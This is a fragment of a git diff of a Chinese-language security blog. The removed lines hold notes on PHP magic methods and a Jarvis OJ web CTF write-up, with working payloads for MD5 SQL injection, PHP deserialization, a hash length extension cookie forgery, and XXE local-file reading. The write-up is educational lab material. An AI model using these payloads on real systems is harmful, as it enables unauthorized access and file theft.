-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call(), callStatic()</span><br></pre></td></tr></table></figure>
-
-<p>方法重载的两个函数 __call()是在对象上下文中调用不可访问的方法时触发 __callStatic()是在静态上下文中调用不可访问的方法时触发。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get(), set()</span><br></pre></td></tr></table></figure>
-
-<p>__get()用于从不可访问的属性读取数据。 __set()用于将数据写入不可访问的属性。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">isset</span>(), <span class="keyword">unset</span>()</span><br></pre></td></tr></table></figure>
-
-<p>__isset()在不可访问的属性上调用isset()或empty()触发。 __unset()在不可访问的属性上使用unset()时触发。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(), wakeup()</span><br></pre></td></tr></table></figure>
-
-<p>serialize()检查您的类是否具有魔术名sleep()的函数。如果是这样，该函数在任何序列化之前执行。它可以清理对象，并且应该返回一个数组，其中应该被序列化的对象的所有变量的名称。如果该方法不返回任何内容，则将NULL序列化并发出E_NOTICE。sleep()的预期用途是提交挂起的数据或执行类似的清理任务。此外，如果有非常大的对象，不需要完全保存，该功能将非常有用。 unserialize()使用魔术名wakeup()检查函数的存在。如果存在，该功能可以重构对象可能具有的任何资源。wakeup()的预期用途是重新建立在序列化期间可能已丢失的任何数据库连接，并执行其他重新初始化任务。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString()</span><br></pre></td></tr></table></figure>
-
-<p>__toString（）方法允许一个类决定如何处理像一个字符串时它将如何反应。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__invoke()</span><br></pre></td></tr></table></figure>
-
-<p>当脚本尝试将对象调用为函数时，调用__invoke()方法。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__set_state()</span><br><span class="line">__clone()</span><br><span class="line">__debugInfo()</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+          
+            <div class="post-button">
+              <a class="btn" href="/2018/09/27/序列化、反序列化的理解/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1188,79 +907,16 @@ U - unicode string unicode编码的字符串</code></pre><h3 id="0x05使用场�
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h2><p>一上来看有点懵逼，以为是Burp抓包。最后google后发现应该在vps上（不用vps的话经过路由器可能端口就变了）用以下命令就可以。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --ocal-port http://xxx.com</span><br></pre></td></tr></table></figure>
-
-<p>之前没有接触过curl，只是在docker里面用过一次。</p>
-<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl就是：在linux中一个利用<span class="built_in">URL</span>规则在命令行下工作的文件传输工具，可以说是一款很强大的<span class="keyword">http</span>命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。 由于安装linux的时候很多时候是没有安装桌面的，也意味着没有浏览器，因此这个方法也经常用于测试一台服务器是否可以到达一个网站。 当然也可以进行ip伪造等等测试操作。</span><br></pre></td></tr></table></figure>
-
-<h2 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p>burp抓包添加头</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">X-Forwarded-For</span>: 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>抓包后发现Hint：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"<span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">'admin'</span> <span class="keyword">where</span> <span class="keyword">password</span>=<span class="string">'".md5($pass,true)."'</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
-
-<p>首先想到MD5注入。</p>
-<p>具体原理： </p>
-<ul>
-<li>提价传入的password如果是特殊字符串，那么该字符串转化为MD5再经过PHP转化为字符串后变成： <code>&#39;or&#39;6蒥欓!r,b</code> </li>
-<li>那么最后的sql语句则变成： <code>select * from</code>admin<code>where password=&#39;&#39;or&#39;6蒥欓!r,b&#39;</code> 即成功闭合了’ bypass成功。</li>
-</ul>
-<h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><p>发现url里面有base64编码。猜测是利用base64访问任意文件。 分别读取index.php，shield.php。审计源码发现存在反序列化漏洞。 通过脚本：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file = <span class="string">"pctf.php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $chybeta = <span class="keyword">new</span> Shield();</span><br><span class="line">    print_r(serialize($chybeta));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>生成序列化串：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:"Shield":1:&#123;s:4:"file";s:8:"pctf.php";&#125;`</span><br></pre></td></tr></table></figure>
-
-<p>访问： </p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://web.jarvisoj.com:32768/index.php?class=O:6:<span class="number">%22</span>Shield<span class="number">%22</span>:1:&#123;s:4:<span class="number">%22</span>file<span class="number">%22</span>;s:8:<span class="number">%22</span>pctf.php<span class="number">%22</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>查看源码得flag</p>
-<h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>右键源码发现注释Hint： index.phps </p>
-<p>访问后,发现源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span>     $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi   (<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span>   substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"work harder!harder!  harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>题目意思是:GET传三个字符参数，然后每个参数满足以下条件： </p>
-<ul>
-<li><p>①：id是字符，还需要值为0.所以利用php弱类型0a即可让字符0a转化成数字0</p>
-</li>
-<li><p>②：a是一个文件（file_get_contents()函数提取a的内容赋值给data），那么可以是自己vps创建一个文件，也可以利用伪协议php://input。 </p>
-</li>
-<li><p>③：b满足长度大于5，eregi（）里面满足第一个字符为4，substr（）里面又需要满足b首字母！=4.那么我们可以利用%00截断:b=%0011111即可绕过substr和eregi()，eregi（“111”，“1114”）满足。同时%00对strlen不会发生截断。</p>
-<p>饶过后发现<code>/^HT2mCpcvOLf</code>访问自动补全： `</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32780</span><span class="regexp">/%5eHT2mCpcvOLf/i</span>ndex.php?id=<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>猜测是注入漏洞，上sqlmap发现有waf。过滤了空格关键字，空格可以内敛注释绕过，关键字发现只过滤了一次直接双写绕过。然后常规注入得flag。</p>
-</li>
-</ul>
-<h2 id="RE？"><a href="#RE？" class="headerlink" title="RE？"></a>RE？</h2><p>一看题目和.so的文件有点害怕，完全没思路。 google后才知道mysql可以导入进去。</p>
-<p>导入到plugin文件中，利用该文件创建函数help_me（提示）: <code>create function help_me returns string soname &#39;udf.so&#39;</code> </p>
-<p>然后select heilp_me;提示：<code>use getflag function to obtain your flag!</code> 模仿前面创建一个getflag函数调用的flag。</p>
-<h2 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h2><p>首先想到前端认证抓个包发现cookie里面有个guest，改成admin无果。别的地方貌似没有突破口。那就扫一下敏感目录吧。御剑，AWVS无果。 </p>
-<p>发现一个新的py脚本动态多线程工具：weakfilescan 附链接: `</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/ring04h/</span>weakfilescan</span><br></pre></td></tr></table></figure>
-
-<p>命令：</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wyspider<span class="selector-class">.py</span> http:<span class="comment">//web.jarvisoj.com:32778</span></span><br></pre></td></tr></table></figure>
-
-<p>发现有个index.php~，下载notepad++打开发现乱码，挠头。。。 经过尝试发现linux有个查看文件的命令： <code>#file xxx</code> 然后尝试一下发现是： vim swap file 对于swap是交换的意思，google后发现是vim在编辑的时候强制退出而生成的文件，可以用命令： <code>vim -r index.php.swp</code> 来恢复，恢复后发现源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $auth = <span class="keyword">false</span>;</span><br><span class="line">    $role = <span class="string">"guest"</span>;</span><br><span class="line">    $salt = </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span><br><span class="line">        $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span><br><span class="line">        $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">        <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;</span><br><span class="line">            $auth = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $auth = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $s = serialize($role);</span><br><span class="line">        setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">        $hsh = md5($salt.strrev($s));</span><br><span class="line">        setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">    &#125; else &#123;</span></span><br><span class="line"><span class="string">        echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>发现最关键的是要绕过：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]</span><br></pre></td></tr></table></figure>
-
-<p>利用hash扩展攻击即可，hash拓展攻击下篇详细总结一下。可以利用hashpump直接爆破出role和hsh。不过需要注意题目反转反序列化传入顺序。 最后payload：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">role = s%<span class="number">3</span>a5%<span class="number">3</span>a<span class="string">"admin"</span>%<span class="number">3</span>b%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%c0%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">80</span>s%<span class="number">3</span>a5%<span class="number">3</span>a<span class="string">"guest"</span>%<span class="number">3</span>b`</span><br><span class="line">hsh = fcdc3840332555511c4e4323f6decb07`</span><br></pre></td></tr></table></figure>
-
-<h2 id="61dctf-admin"><a href="#61dctf-admin" class="headerlink" title="[61dctf]admin"></a>[61dctf]admin</h2><p>抓包后发现貌似和flag在管理员手机的题目有点相似，扫目录发现有robots.txt。访问后发现.php访问的flag提交竟然不对。突然发现flag是flag{hello guest}，而题目是admin显然这是个假flag。</p>
-<p>然后尝试抓包的真flag。</p>
-<h2 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h2><p>Hint：请设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
-<p>则想办法文件读取。加上题目提示很容易想到调用别的东西来文件读取。</p>
-<p>右键看页面源码发现有json和xml。可能就是xml注入进行任意文件读取。 抓包把content-type=json改成content-type=xml。然后传一段任意文件读取的xml代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY name SYSTEM &quot;file://home/ctf/flag.txt&quot;&gt; ]&gt;  </span><br><span class="line">&lt;root&gt;&amp;name;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<p>有关于xml的知识之前也是接触过XEE外部实体注入漏洞。后面可能出一篇能用的xml知识。</p>
-
+          <h2 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h2><p>一上来看有点懵逼，以为是Burp抓包。最后google后发现应该在vps上（不用vps的话经过路由器可能端口就变了）用以下命令就可以。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --ocal-port http://xxx.com</span><br></pre></td></tr></table></figure><p>之前没有接触过curl，只是在docker里面用过一次。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl就是：在linux中一个利用<span class="built_in">URL</span>规则在命令行下工作的文件传输工具，可以说是一款很强大的<span class="keyword">http</span>命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。 由于安装linux的时候很多时候是没有安装桌面的，也意味着没有浏览器，因此这个方法也经常用于测试一台服务器是否可以到达一个网站。 当然也可以进行ip伪造等等测试操作。</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+          
+            <div class="post-button">
+              <a class="btn" href="/2018/09/26/Jarvis OJ Web WriteUp(1)/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
